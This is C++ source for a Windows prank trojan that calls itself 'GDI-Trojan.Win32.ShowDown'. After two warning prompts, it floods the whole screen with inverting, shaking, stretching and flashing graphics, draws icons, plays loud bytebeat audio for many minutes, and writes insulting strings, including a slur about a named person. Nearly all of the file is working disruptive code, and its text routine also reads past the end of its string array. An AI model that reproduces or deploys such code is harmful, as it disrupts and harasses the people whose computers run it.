#include <Windows.h>
#include <math.h>

#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "winmm.lib")

#define PI 3.14159265358979323846264338327950288

typedef struct
{
	float x;
	float y;
	float z;
} Vertex;

enum
{
	REDRAW = RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN,
};

unsigned int xs;

DWORD XorShift(void)
{
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

typedef struct
{
	float h;
	float s;
	float l;
} HSL;

typedef union _RGBQUAD
{
	struct
	{
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE reserved;
	};
} RGBQUAD_t;

typedef RGBQUAD_t* PRGBQUAD_t;

static float HueToRGB(float p, float q, float t)
{
	if (t < 0.0f) t += 1.0f;
	if (t > 1.0f) t -= 1.0f;
	if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
	if (t < 1.0f / 2.0f) return q;
	if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
	return p;
}

RGBQUAD_t HSLtoRGB(HSL hsl)
{
	RGBQUAD_t rgb;
	rgb.reserved = 0;

	if (hsl.s == 0.0f)
	{
		BYTE val = (BYTE)(hsl.l * 255.0f);
		rgb.r = val;
		rgb.g = val;
		rgb.b = val;
	}

	else
	{
		float q =
			(hsl.l < 0.5f) ? (hsl.l * (1.0f + hsl.s)) :
			(hsl.l + hsl.s - hsl.l * hsl.s);

		float p = 2.0f * hsl.l - q;

		rgb.r = (BYTE)(HueToRGB(p, q, hsl.h + 1.0f / 3.0f) * 255.0f);
		rgb.g = (BYTE)(HueToRGB(p, q, hsl.h) * 255.0f);
		rgb.b = (BYTE)(HueToRGB(p, q, hsl.h - 1.0f / 3.0f) * 255.0f);
	}

	return rgb;
}

HSL RGBtoHSL(RGBQUAD_t rgb)
{
	float r = rgb.r / 255.0f;
	float g = rgb.g / 255.0f;
	float b = rgb.b / 255.0f;
	float max = fmaxf(r, fmaxf(g, b));
	float min = fminf(r, fminf(g, b));
	float h, s, l = (max + min) / 2.0f;

	if (max == min)
	{
		h = s = 0;
	}

	else
	{
		float d = max - min;
		s = l > 0.5f ? d / (2 - max - min) : d / (max + min);
		if (max == r) h = (g - b) / d + (g < b ? 6 : 0);
		else if (max == g) h = (b - r) / d + 2;
		else h = (r - g) / d + 4;
		h /= 6;
	}

	return { h, s, l };
}

int r = 0, g = 0, b = 0;
int state = 0;

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

enum
{
	MEM_ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE
};

namespace GDIPayloads
{
	DWORD WINAPI Rects(LPVOID lpParam)
	{
		int x = w - 50;
		int y = h - 50;

		while (1)
		{
			if (state == 0)
			{
				g += 5; if (g >= 255) state = 1;
			}
			
			else if (state == 1)
			{
				r -= 5; if (r <= 0) state = 2;
			}
			
			else if (state == 2)
			{
				b += 5; if (b >= 255) state = 3;
			}
			
			else if (state == 3)
			{
				g -= 5; if (g <= 0) state = 4;
			}
			
			else if (state == 4)
			{
				r += 5; if (r >= 255) state = 5;
			}
			
			else if (state == 5)
			{
				b -= 5; if (b <= 0) state = 0;
			}

			HDC hdc = GetDC(0);

			HBRUSH brush = CreateSolidBrush(RGB(r, g, b));
			SelectObject(hdc, brush);

			Rectangle(hdc, rand() % x, rand() % y, rand() % x, rand() % y);
			Sleep(1);
			DeleteObject(brush);
			ReleaseDC(0, hdc);
		}
	}
	/*
	DWORD WINAPI TextsDVD(LPVOID lpParam)
	{

	}*/

	DWORD WINAPI Gradient(LPVOID lpParam)
	{
		HDC hdc = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdc);

		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = -h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* pixels = nullptr;
		HBITMAP hBmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
		SelectObject(hdcMem, hBmp);

		float timer = 0.0f;

		BLENDFUNCTION blend = { 0 };
		blend.BlendOp = AC_SRC_OVER;
		blend.BlendFlags = 0;
		blend.SourceConstantAlpha = 125;
		blend.AlphaFormat = 0;

		while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
			timer += 0.04f;

			for (int y = 0; y < h; y++) {
				float factor1 = (float)y / h;
				float factor2 = 1.0f - factor1;

				BYTE r = (BYTE)((cos(timer + factor1 * 3.0f) * 0.5f + 0.5f) * 255);
				BYTE g = (BYTE)((sin(timer + factor2 * 2.0f) * 0.5f + 0.5f) * 255);
				BYTE b = (BYTE)((tan(timer + factor1 * 4.0f) * 0.5f + 0.5f) * 255);

				for (int x = 0; x < w; x++) {
					int index = y * w + x;

					pixels[index].rgbRed = r;
					pixels[index].rgbGreen = g;
					pixels[index].rgbBlue = b;
					pixels[index].rgbReserved = 0;
				}
			}

			AlphaBlend(hdc, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);

			Sleep(16);
		}

		DeleteObject(hBmp);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdc);

		InvalidateRect(NULL, NULL, TRUE);

		return 0;
	}

	DWORD WINAPI PatBltEff(LPVOID lpParam)
	{
		while (1)
		{
			HDC hdc = GetDC(0);
			HDC dcCopy = CreateCompatibleDC(hdc);
			HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
			SelectObject(dcCopy, bm);
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hdc, brush);
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			DeleteObject(brush);
			DeleteObject(dcCopy);
			DeleteObject(bm);
			ReleaseDC(0, hdc);
			Sleep(1);
		}
	}

	DWORD WINAPI Stretch(LPVOID lpParam)
	{
		// Credits to UltraDasher

		HDC hdc = GetDC(0);

		float radius = 0.f;
		double angle = 0;

		while (1)
		{
			hdc = GetDC(0);

			float x = (cos(angle)) * radius;
			float y = (sin(angle)) * radius;

			StretchBlt(hdc, x, y, w - x * 2, h - y * 2, hdc, 0, 0, w, h, SRCCOPY);
			radius += 0.1f;

			ReleaseDC(0, hdc);

			angle = fmod(angle + PI / radius, PI * radius) / 1.001;
		}
	}

	DWORD WINAPI HatchBrush(LPVOID lpParam)
	{
		HDC hdc = GetDC(0);
		HDC dcCopy = CreateCompatibleDC(hdc);
		
		HBRUSH brush = CreateHatchBrush(rand() % 4, 0);

		while (true)
		{
			SelectObject(hdc, brush);
			SetBkColor(hdc, RGB(rand() % 25, rand() % 25, rand() % 25));
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			Sleep(1);
		}

		DeleteObject(brush);
		DeleteDC(hdc);
		return 0;
	}

	DWORD WINAPI HalfTone(LPVOID lpParam)
	{
		HDC hdc = GetDC(0);

		while (true)
		{
			hdc = GetDC(0);
			SetStretchBltMode(hdc, HALFTONE);
			StretchBlt(hdc, rand() % 3, rand() % 3, w - 1, h - 1, hdc, rand() % 3, rand() % 3, w, h, SRCCOPY);
			Sleep(1);
			ReleaseDC(NULL, hdc);
		}
	}

	DWORD WINAPI Shake(LPVOID lpParam)
	{
		while (1)
		{
			HDC dc = GetDC(0);
			//int x = SM_CXSCREEN;
			//int y = SM_CYSCREEN;
			BitBlt(dc, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, SRCCOPY);
			Sleep(1);

			if (rand() % 25 == 24)
			{
				RedrawWindow(NULL, NULL, NULL, REDRAW);
			}

			ReleaseDC(0, dc);
		}
	}

	DWORD WINAPI SrcInvert(LPVOID lpParam)
	{
		HDC dc = GetDC(0);

		while (true)
		{
			if (rand() % 2 == 0)
			{
				BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x999999);
			}
			else
			{
				BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x666666);
			}

			Sleep(rand() % 5);
		}
	}

	DWORD WINAPI Texts(LPVOID lpParam)
	{
		HDC hdc = GetDC(0);

		LOGFONTW lFont = { 0 };

		lFont.lfWidth = 20;
		lFont.lfHeight = 60;
		lFont.lfOrientation = 400;
		lFont.lfWeight = 600;
		lFont.lfUnderline = true;
		lFont.lfQuality = DRAFT_QUALITY;
		lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

		lstrcpy(lFont.lfFaceName, L"Arial Black");

		LPCSTR strings[] =
		{
			"You fucking liar", "Stop", "Haha you loser", "dick", "DICK1999", "ShowDown.exe",
			"better luck next time", "CrzxyMinty is a fucking retard", "Reugen", "L M A O",
			"Nazar is cool", "24566", "DWORD WINAPI", "null", "Int Pointer", "shader"
		};

		while (true)
		{
			lFont.lfEscapement = rand() % 60;

			HFONT hFont = CreateFontIndirectW(&lFont);
			SelectObject(hdc, hFont);

			SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
			SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

			int index = rand() % 40;

			TextOutA(hdc, rand() % w, rand() % h, strings[index], lstrlenA(strings[index]));

			Sleep(rand() % 5);
		}

		return 0;
	}

	DWORD WINAPI Icons(LPVOID lpParam)
	{
		while (1)
		{
			HDC hdc = GetDC(0);

			int x = GetSystemMetrics(0);
			int y = GetSystemMetrics(1);

			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_APPLICATION));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ASTERISK));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_EXCLAMATION));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_SHIELD));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_HAND));
			Sleep(1);
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
			Sleep(1);
		}
	}
}

namespace Bytebeats
{
	DWORD WINAPI Bytebeat1(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		const int bufferSize = 17000 * 60;
		BYTE* sbuffer = new BYTE[bufferSize];
		
		DWORD t = 0;

		while (true)
		{
			for (int i = 0; i < bufferSize; i++, t++)
			{
				sbuffer[i] = (BYTE)(t * ((t >> 12 | t >> 8) & 63 & t >> 4));
			}
			
			WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			Sleep(30000);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		}

		return 0;
	}

	DWORD WINAPI Bytebeat2(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		const int bufferSize = 32100 * 5;
		BYTE* sbuffer = new BYTE[bufferSize];
		DWORD t = 0;

		while (true)
		{
			for (int i = 0; i < bufferSize; i++, t++)
			{
				DWORD c = t * 4;
				DWORD freq = (c | c << 2) >> 100;

				sbuffer[i] = (BYTE)(t | (freq | t) % 800);
			}

			WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

			Sleep(5000);

			waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		}

		delete[] sbuffer;
		return 0;
	}
}

int WINAPI WinMain
(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nShowCmd
)
{
	if
	(
		MessageBoxW
		(
			NULL,
			L"ATENTION!!!\n\nThis program is malicious. Do you want run?",
			L"'My god you so idiot'",
			MB_ICONWARNING | MB_YESNO
		) != IDYES
	) return 1;

	if
	(
		MessageBoxW
		(
			NULL,
			L"LAST WARNING!!!\n\nAre you sure do you want to run?",
			L"GDI-Trojan.Win32.ShowDown - FINAL WARNING",
			MB_ICONWARNING | MB_YESNO
		) != IDYES
	
	) return 1;

	CreateThread(0, 0, Bytebeats::Bytebeat1, 0, 0, 0);
	Sleep(60000);
	CreateThread(0, 0, GDIPayloads::Rects, 0, 0, 0);
	Sleep(60000);
	CreateThread(0, 0, GDIPayloads::Shake, 0, 0, 0);
	Sleep(120000);
	CreateThread(0, 0, GDIPayloads::HalfTone, 0, 0, 0);
	Sleep(60000);
	CreateThread(0, 0, GDIPayloads::PatBltEff, 0, 0, 0);
	Sleep(120000);
	CreateThread(0, 0, Bytebeats::Bytebeat2, 0, 0, 0);
	CreateThread(0, 0, GDIPayloads::Stretch, 0, 0, 0);
	CreateThread(0, 0, GDIPayloads::HatchBrush, 0, 0, 0);
	Sleep(180000);
	CreateThread(0, 0, GDIPayloads::Gradient, 0, 0, 0);
	CreateThread(0, 0, GDIPayloads::Icons, 0, 0, 0);
	Sleep(180000);
	CreateThread(0, 0, GDIPayloads::SrcInvert, 0, 0, 0);
	CreateThread(0, 0, GDIPayloads::Texts, 0, 0, 0);
	Sleep(INFINITE);
}
